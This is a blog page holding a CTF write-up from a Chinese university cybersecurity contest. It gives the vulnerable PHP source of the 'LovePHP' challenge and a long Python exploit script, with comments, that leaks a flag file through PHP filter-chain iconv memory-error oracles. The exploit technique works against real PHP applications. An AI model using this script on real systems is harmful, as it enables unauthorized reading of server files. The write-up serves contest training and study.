<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>全国大学生网络安全大赛 第七届蓝帽杯 Writeup - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="全国大学生网络安全大赛 第七届蓝帽杯 Writeup - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/08/28/%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%20%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%20Writeup/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-08-28T15:05:20.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>August</span>
            <span>28,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">全国大学生网络安全大赛 第七届蓝帽杯 Writeup</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="LovePHP"><a href="#LovePHP" class="headerlink" title="LovePHP"></a>LovePHP</h2><p>filterchain侧信道盲注攻击</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Saferman</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$check</span> = True;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check === True)&#123;</span><br><span class="line"><span class="title function_ invoke__">file</span>(<span class="variable">$_GET</span>[‘secret’]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;check=False;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[‘my_secret.flag’]))&#123;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[‘my_secret.flag’]);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(FILE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要做的也就是直接掏出脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">THE GRAND IDEA:</span></span><br><span class="line"><span class="string">We can use PHP memory limit as an error oracle. Repeatedly applying the convert.iconv.L1.UCS-4LE</span></span><br><span class="line"><span class="string">filter will blow up the string length by 4x every time it is used, which will quickly cause</span></span><br><span class="line"><span class="string">500 error if and only if the string is non empty. So we now have an oracle that tells us if</span></span><br><span class="line"><span class="string">the string is empty.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">THE GRAND IDEA 2:</span></span><br><span class="line"><span class="string">The dechunk filter is interesting.</span></span><br><span class="line"><span class="string">https://github.com/php/php-src/blob/01b3fc03c30c6cb85038250bb5640be3a09c6a32/ext/standard/filters.c#L1724</span></span><br><span class="line"><span class="string">It looks like it was implemented for something http related, but for our purposes, the interesting</span></span><br><span class="line"><span class="string">behavior is that if the string contains no newlines, it will wipe the entire string if and only if</span></span><br><span class="line"><span class="string">the string starts with A-Fa-f0-9, otherwise it will leave it untouched. This works perfect with our</span></span><br><span class="line"><span class="string">above oracle! In fact we can verify that since the flag starts with D that the filter chain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">dechunk|convert.iconv.L1.UCS-4LE|convert.iconv.L1.UCS-4LE|[...]|convert.iconv.L1.UCS-4LE</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">does not cause a 500 error.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">THE REST:</span></span><br><span class="line"><span class="string">So now we can verify if the first character is in A-Fa-f0-9. The rest of the challenge is a descent</span></span><br><span class="line"><span class="string">into madness trying to figure out ways to:</span></span><br><span class="line"><span class="string">- somehow get other characters not at the start of the flag file to the front</span></span><br><span class="line"><span class="string">- detect more precisely which character is at the front</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">join</span>(<span class="params">*x</span>):</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;|&#x27;</span>.join(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">err</span>(<span class="params">s</span>):</span><br><span class="line">	<span class="built_in">print</span>(s)</span><br><span class="line">	<span class="keyword">raise</span> ValueError</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">req</span>(<span class="params">s</span>):</span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">&#x27;my[secret.flag&#x27;</span>:<span class="string">&#x27;C:8:&quot;Saferman&quot;:0:&#123;&#125;&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;secret&#x27;</span>: <span class="string">f&#x27;php://filter/<span class="subst">&#123;s&#125;</span>/resource=/flag&#x27;</span></span><br><span class="line">	&#125;</span><br><span class="line">	r=requests.get(<span class="string">&#x27;http://39.105.5.7:47698/&#x27;</span>, params=data)</span><br><span class="line">	<span class="built_in">print</span>(r.status_code)</span><br><span class="line">	<span class="keyword">return</span> r.status_code == <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Step 1:</span></span><br><span class="line"><span class="string">The second step of our exploit only works under two conditions:</span></span><br><span class="line"><span class="string">- String only contains a-zA-Z0-9</span></span><br><span class="line"><span class="string">- String ends with two equals signs</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">base64-encoding the flag file twice takes care of the first condition.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">We don&#x27;t know the length of the flag file, so we can&#x27;t be sure that it will end with two equals</span></span><br><span class="line"><span class="string">signs.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Repeated application of the convert.quoted-printable-encode will only consume additional</span></span><br><span class="line"><span class="string">memory if the base64 ends with equals signs, so that&#x27;s what we are going to use as an oracle here.</span></span><br><span class="line"><span class="string">If the double-base64 does not end with two equals signs, we will add junk data to the start of the</span></span><br><span class="line"><span class="string">flag with convert.iconv..CSISO2022KR until it does.</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">blow_up_enc = join(*[<span class="string">&#x27;convert.quoted-printable-encode&#x27;</span>]*<span class="number">1000</span>)</span><br><span class="line">blow_up_utf32 = <span class="string">&#x27;convert.iconv.L1.UCS-4LE&#x27;</span></span><br><span class="line">blow_up_inf = join(*[blow_up_utf32]*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">header = <span class="string">&#x27;convert.base64-encode|convert.base64-encode&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Start get baseline blowup</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Calculating blowup&#x27;</span>)</span><br><span class="line">baseline_blowup = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">	payload = join(*[blow_up_utf32]*n)</span><br><span class="line">	<span class="keyword">if</span> req(<span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;payload&#125;</span>&#x27;</span>):</span><br><span class="line">		baseline_blowup = n</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;baseline blowup is <span class="subst">&#123;baseline_blowup&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">trailer = join(*[blow_up_utf32]*(baseline_blowup-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> req(<span class="string">f&#x27;<span class="subst">&#123;header&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>) == <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;detecting equals&#x27;</span>)</span><br><span class="line">j = [</span><br><span class="line">	req(<span class="string">f&#x27;convert.base64-encode|convert.base64-encode|<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>),</span><br><span class="line">	req(<span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>),</span><br><span class="line">	req(<span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KR|convert.base64-encode|<span class="subst">&#123;blow_up_enc&#125;</span>|<span class="subst">&#123;trailer&#125;</span>&#x27;</span>)</span><br><span class="line">]</span><br><span class="line"><span class="built_in">print</span>(j)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">sum</span>(j) != <span class="number">2</span>:</span><br><span class="line">	err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> j[<span class="number">0</span>] == <span class="literal">False</span>:</span><br><span class="line">	header = <span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> j[<span class="number">1</span>] == <span class="literal">False</span>:</span><br><span class="line">	header = <span class="string">f&#x27;convert.base64-encode|convert.iconv..CSISO2022KR|convert.iconv..CSISO2022KRconvert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> j[<span class="number">2</span>] == <span class="literal">False</span>:</span><br><span class="line">	header = <span class="string">f&#x27;convert.base64-encode|convert.base64-encode&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	err(<span class="string">&#x27;something wrong&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;j: <span class="subst">&#123;j&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;header: <span class="subst">&#123;header&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Step two:</span></span><br><span class="line"><span class="string">Now we have something of the form</span></span><br><span class="line"><span class="string">[a-zA-Z0-9 things]==</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Here the pain begins. For a long time I was trying to find something that would allow me to strip</span></span><br><span class="line"><span class="string">successive characters from the start of the string to access every character. Maybe something like</span></span><br><span class="line"><span class="string">that exists but I couldn&#x27;t find it. However, if you play around with filter combinations you notice</span></span><br><span class="line"><span class="string">there are filters that *swap* characters:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">convert.iconv.CSUNICODE.UCS-2BE, which I call r2, flips every pair of characters in a string:</span></span><br><span class="line"><span class="string">abcdefgh -&gt; badcfehg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">convert.iconv.UCS-4LE.10646-1:1993, which I call r4, reverses every chunk of four characters:</span></span><br><span class="line"><span class="string">abcdefgh -&gt; dcbahgfe</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">This allows us to access the first four characters of the string. Can we do better? It turns out</span></span><br><span class="line"><span class="string">YES, we can! Turns out that convert.iconv.CSUNICODE.CSUNICODE appends &lt;0xff&gt;&lt;0xfe&gt; to the start of</span></span><br><span class="line"><span class="string">the string:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">abcdefgh -&gt; &lt;0xff&gt;&lt;0xfe&gt;abcdefgh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The idea being that if we now use the r4 gadget, we get something like:</span></span><br><span class="line"><span class="string">ba&lt;0xfe&gt;&lt;0xff&gt;fedc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And then if we apply a convert.base64-decode|convert.base64-encode, it removes the invalid</span></span><br><span class="line"><span class="string">&lt;0xfe&gt;&lt;0xff&gt; to get:</span></span><br><span class="line"><span class="string">bafedc</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And then apply the r4 again, we have swapped the f and e to the front, which were the 5th and 6th</span></span><br><span class="line"><span class="string">characters of the string. There&#x27;s only one problem: our r4 gadget requires that the string length</span></span><br><span class="line"><span class="string">is a multiple of 4. The original base64 string will be a multiple of four by definition, so when</span></span><br><span class="line"><span class="string">we apply convert.iconv.CSUNICODE.CSUNICODE it will be two more than a multiple of four, which is no</span></span><br><span class="line"><span class="string">good for our r4 gadget. This is where the double equals we required in step 1 comes in! Because it</span></span><br><span class="line"><span class="string">turns out, if we apply the filter</span></span><br><span class="line"><span class="string">convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">It will turn the == into:</span></span><br><span class="line"><span class="string">+---AD0-3D3D+---AD0-3D3D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And this is magic, because this corrects such that when we apply the</span></span><br><span class="line"><span class="string">convert.iconv.CSUNICODE.CSUNICODE filter the resuting string is exactly a multiple of four!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Let&#x27;s recap. We have a string like:</span></span><br><span class="line"><span class="string">abcdefghij==</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply the convert.quoted-printable-encode + convert.iconv.L1.utf7:</span></span><br><span class="line"><span class="string">abcdefghij+---AD0-3D3D+---AD0-3D3D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply convert.iconv.CSUNICODE.CSUNICODE:</span></span><br><span class="line"><span class="string">&lt;0xff&gt;&lt;0xfe&gt;abcdefghij+---AD0-3D3D+---AD0-3D3D</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply r4 gadget:</span></span><br><span class="line"><span class="string">ba&lt;0xfe&gt;&lt;0xff&gt;fedcjihg---+-0DAD3D3---+-0DAD3D3</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Apply base64-decode | base64-encode, so the &#x27;-&#x27; and high bytes will disappear:</span></span><br><span class="line"><span class="string">bafedcjihg+0DAD3D3+0DAD3Dw==</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Then apply r4 once more:</span></span><br><span class="line"><span class="string">efabijcd0+gh3DAD0+3D3DAD==wD</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">And here&#x27;s the cute part: not only have we now accessed the 5th and 6th chars of the string, but</span></span><br><span class="line"><span class="string">the string still has two equals signs in it, so we can reapply the technique as many times as we</span></span><br><span class="line"><span class="string">want, to access all the characters in the string ;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">flip = <span class="string">&quot;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&quot;</span></span><br><span class="line">r2 = <span class="string">&quot;convert.iconv.CSUNICODE.UCS-2BE&quot;</span></span><br><span class="line">r4 = <span class="string">&quot;convert.iconv.UCS-4LE.10646-1:1993&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_nth</span>(<span class="params">n</span>):</span><br><span class="line">	<span class="keyword">global</span> flip, r2, r4</span><br><span class="line">	o = []</span><br><span class="line">	chunk = n // <span class="number">2</span></span><br><span class="line">	<span class="keyword">if</span> chunk % <span class="number">2</span> == <span class="number">1</span>: o.append(r4)</span><br><span class="line">	o.extend([flip, r4] * (chunk // <span class="number">2</span>))</span><br><span class="line">	<span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">1</span>) ^ (chunk % <span class="number">2</span> == <span class="number">1</span>): o.append(r2)</span><br><span class="line">	<span class="keyword">return</span> join(*o)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Step 3:</span></span><br><span class="line"><span class="string">This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first</span></span><br><span class="line"><span class="string">char is 0-9A-Fa-f. So it&#x27;s just a matter of finding filters which translate to or from those</span></span><br><span class="line"><span class="string">chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but</span></span><br><span class="line"><span class="string">I just bruteforced every combination of iconv filters to find these.</span></span><br><span 